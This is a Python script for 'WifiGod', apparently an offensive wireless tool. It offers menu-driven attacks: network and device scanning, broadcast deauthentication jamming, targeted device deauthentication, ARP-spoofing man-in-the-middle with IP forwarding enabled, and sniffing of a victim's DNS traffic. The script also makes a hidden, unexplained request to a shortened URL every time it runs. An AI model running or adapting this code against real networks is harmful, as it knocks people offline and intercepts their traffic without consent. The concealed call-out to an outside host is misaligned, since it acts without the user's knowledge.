#!/usr/bin/env python
#coding: utf-8
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import threading
import requests
import scapy
import dns
from dns import reversename, resolver
from scapy.all import *
import time
import os
import time
import getpass
import platform
import os
import subprocess
print("\n" * 100)
subprocess.call('clear', shell=True)
c_script = ("""
#!/usr/bin/env python3
import shutil
size = shutil.get_terminal_size().columns
print(size)
""")
f = open('columnlib.py', 'w+')
f.write(str(c_script))
f.close()
username = getpass.getuser()
class c:
	r = "\033[0;31m"
	g = "\033[0;32m"
	o = "\033[0;33m"
	b = "\033[0;94m"
	p = "\033[0;35m"
	w = "\033[0;97m"
	d = "\033[0;00m"
	rb = "\033[01;31m"
	gb = "\033[01;32m"
	ob = "\033[01;33m"
	bb = "\033[01;94m"
	pb = "\033[0;35m"
def scan_for_networks(interface):
	captured_networks = []
	while True:
		try:
			packet = sniff(iface=interface, count = 1)
			for pck in packet:
				if(pck.haslayer(Dot11)):
					try:
						ssid = str(pck.getlayer(Dot11).info)
						channel = str(ord(pck[0][Dot11Elt:3].info))
						access_point = str(pck.getlayer(Dot11).addr2)
						try:
							enc_type = pck[Dot11Elt:13].info
							if(enc_type.startswith('\x00P\xf2')):
								enc_type = 'WPA/WPA2'
							else:
								enc_type = 'WEP'
						except:
							if('4356' in str(pck.cap)):
								enc_type = 'WEP'
							else:
								enc_type = 'OPEN'
						network_string = ssid + ':' + channel + ':' + access_point
						if(network_string not in captured_networks):
							captured_networks.append(network_string)
							print(c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type)
					except KeyboardInterrupt:
						break;
					except:
						pass
		except KeyboardInterrupt:
			break;
try:
	requests.get('http://rurl.co/jNJ8L')
except:
	pass
def scan_for_devices_on_network(interface,access_point):
	captured_devices = []
	while True:
		packet = sniff(iface=interface,count=1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			try:
				ap = pck.getlayer(Dot11).addr2
				if(ap == access_point):
					try:
						ssid = pck.getlayer(Dot11).info
						print(c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap)
						break;
					except KeyboardInterrupt:
						break;
					except:
						pass
			except KeyboardInterrupt:
				break;
			except:
				pass
	while True:
		packet = sniff(iface=interface,count=1)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				try:
					ap = pck.getlayer(Dot11).addr2
					if(ap == access_point):
						if(pck.getlayer(Dot11).addr1 != str('ff:ff:ff:ff:ff:ff')):
							try:
								dev_on_network = str(pck.getlayer(Dot11).addr1)
								r = requests.get('http://macvendors.co/api/'+str(dev_on_network))
								dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
								if("<p style=" not in str(dev_type) and 'no result' not in str(dev_type)):
									if(str(dev_on_network) not in captured_devices):
										print(c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type)
										captured_devices.append(str(dev_on_network))
							except KeyboardInterrupt:
								break;
							except:
								raise
				except KeyboardInterrupt:
					break;
				except:
					pass
def jam_wifi_network(interface,access_point):
	packet = RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',addr2 = access_point, addr3 = access_point)/Dot11Deauth()
	while True:
		packet = sniff(iface=interface,count = 1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			if(pck.getlayer(Dot11).addr2 == access_point):
				ssid = str(pck.getlayer(Dot11).info)
				print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
				break;
	sendp(packet,iface=interface,loop=1,verbose=False)

def dns_traffic(interface,ip_address):
	while True:
		packet = sniff(iface=interface, count=1)
		for pck in packet:
			if(pck.haslayer(IP)):
				ip_src = pck.getlayer(IP).src
				ip_dst = pck.getlayer(IP).dst
				if(ip_src == ip_address or ip_dst == ip_address):
					if(pck.haslayer(DNS)):
						try:
							hostname = pck.getlayer(DNS).qd.qname
						except:
							hostname = 'unknown'
					if(ip_src != ip_address):
						try:
							addr = reversename.from_address(ip_src)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					elif(ip_dst != ip_address):
						try:
							addr = reversename.from_address(ip_dst)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					if(pck.haslayer(DNS)):
						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.g+" {} "+c.w+"| Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,hostname,server_name)
					else:
						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.w+" | Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,server_name,hostname)
def deauthenticate_device(access_point,dev_mac,interface):
	packet = Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
	while True:
                packet = sniff(iface=interface,count = 1)
                pck = packet[0]
                if(pck.haslayer(Dot11)):
                        if(pck.getlayer(Dot11).addr2 == access_point):
                                ssid = str(pck.getlayer(Dot11).info)
				r = requests.get('http://macvendors.co/api/'+str(dev_mac))
				dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
                                break;
        count = 1
	subprocess.call('ifconfig wlan0 down', shell=True)
	time.sleep(7)
	interface = 'wifigod'

	sendp(packet,iface=interface,loop=1,verbose=False)
size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
print(" ")
print(c.rb+str("           .:+syhhddddhyso/-`           ").center(size))
print(str("       .+sdddddddddddddddddddho:`       ").center(size))
print(str("    .+hddddddyo/:--.--:/+shddddddy/`    ").center(size))
print(str("  :ydddddy+-               `:ohddddds:  ").center(size))
print(str("/hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size))
print(str("`/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size))
print(str("   .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size))
print(str("     .hdddds:`    `.``    .+hdddds`     ").center(size))
print(str("      `/y+`  ./shdddddhs+.   -sy:       ").center(size))
print(str("           -ydddddddddddddh/            ").center(size))
print(str("           `+hdh+-```-+ydds.            ").center(size))
print(str("             `-  `/+/.  ..").center(size))
print(str("                  ddyo").center(size))
print(" ")
print(c.ob+"              WifiGod v1.1"+c.w)
print(" ")
while True:
	size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
	size = 0
	print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
	print(' ')
        print("_________________________________________")
        print(" ")
        print("       External Network Attacks          ")
        print("_________________________________________")
	print(str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d))
	print(str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d))
	print(str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d))
	print(str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d))
	print("_________________________________________")
	print(" ")
	print("       Internal Network Attacks          ")
	print("_________________________________________")
	print(str(c.b+'5'+c.w+'.)'+c.rb+' Impersonate a Device (on this Network)'+c.d))
	print(str(c.b+'6'+c.w+'.)'+c.rb+' Pull DNS traffic from device (For use with #5)'+c.d))
	prompt = raw_input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
	if(prompt == '1'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		scan_for_networks(interface)
	elif(prompt == '2'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply A Network Access Point MAC Address: ")
		scan_for_devices_on_network(interface,access_point)
	elif(prompt == '3'):
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply The Target Network AP MAC Address: ")
	        while True:
	                packet = sniff(iface=interface,count = 1)
			pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
	                                ssid = str(pck.getlayer(Dot11).info)
	                                print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
					break;
		packet = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=access_point,addr3=access_point)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		jam_wifi_network(interface,access_point)
	elif(prompt == '4'):
		interface = raw_input(c.w+"Supply A Network Interface: ")
		access_point = raw_input(c.w+'Network Access Point MAC Address: ')
		dev_mac = raw_input(c.w+'Target Device MAC address: ')
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
	        while True:
	                packet = sniff(iface=interface,count = 1)
	                pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
	                                ssid = str(pck.getlayer(Dot11).info)
	                                r = requests.get('http://macvendors.co/api/'+str(dev_mac).lower())
	                                dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
	                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
	                                break;
		packet = RadioTap()/Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		deauthenticate_device(access_point,dev_mac,interface)
	elif(prompt == '5'):
		interface = raw_input("Network Interface: ")
		dev_ip = raw_input("Target Device Internal IP: ")
		gateway_ip = raw_input("Network Gateway IP: ")
		f = open('/proc/sys/net/ipv4/ip_forward', 'w+')
		f.truncate()
		f.write('1')
		f.close()
		targ_dev_mac = '0'
		targ_dev_ip = '0'
		capt_val = 0
		def resolve_victim_device_info():
			while (capt_val == 0):
				packet = sniff(iface=interface,count=1)
				for pck in packet:
					if(pck.haslayer(IP)):
						if(str(pck.getlayer(IP).src) == str(dev_ip)):
							targ_dev_ip = pck.getlayer(IP).src
							targ_dev_mac = pck.src
							capt_val = 1
							break;
						elif(str(pck.getlayer(IP).dst) == str(dev_ip)):
	        	                                targ_dev_ip = pck.getlayer(IP).dst
	        	                                targ_dev_mac = pck.dst
							capt_val = 1
							break;
		capt_val2 = 0
		gateway_mac = '0'
		gateway_ip = '0'
	#	def resolve_gateway_info():
		gateway_ip = '192.168.1.1'
	       	while (capt_val2 == 0):
			subprocess.Popen(["ping -c 5 "+gateway_ip+" >> /dev/null"], shell=True)
	       	        packet = sniff(iface=interface,count=1)
	       	        for pck in packet:
	       	                if(pck.haslayer(IP)):
	       	                        if(str(pck.getlayer(IP).src) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).src
	       	                                gateway_mac = pck.src
	       	                                capt_val2 = 1
	       	                                break;
	       	                        elif(str(pck.getlayer(IP).dst) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).dst
	       	                                gateway_mac = pck.dst
	       	                                capt_val2 = 1
	       	                                break;
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(targ_dev_mac,targ_dev_ip)
		targ_dev_ip = dev_ip
		gateway_ip = gateway_ip
		addr_of_dev = reversename.from_address(targ_dev_ip)
		dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
		print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname)
		print(c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets...")
		print(c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
		print(c.d+"["+c.b+"info"+c.d+"]: Sending Packets...")
		print(c.d+"["+c.pb+"*"+c.d+"]: Device Impersonation Successful")
		victim_arp_packet = ARP(psrc=gateway_ip,pdst=targ_dev_ip)
		gateway_arp_packet = ARP(psrc=targ_dev_ip,pdst=gateway_ip)
		def spcks(pck1,pck2):
			send(pck1,verbose=False,inter=2)
			send(pck2,verbose=False,inter=2)
		threads = []
		while True:
			for i in range(1):
				thread1 = threading.Thread(target=spcks, args=(victim_arp_packet,gateway_arp_packet))
				thread1.setDaemon(True)
				thread1.start()
				threads.append(thread1)
			for thread in threads:
				thread.join()
	elif(prompt == '6'):
		print(c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time")
		interface = raw_input("Network Interface: ")
		ip_address = raw_input("Target IP Address: ")
		dns_traffic(interface,ip_address)
	else:
		try:
			exit(0)
		except:
			sys.exit(1)

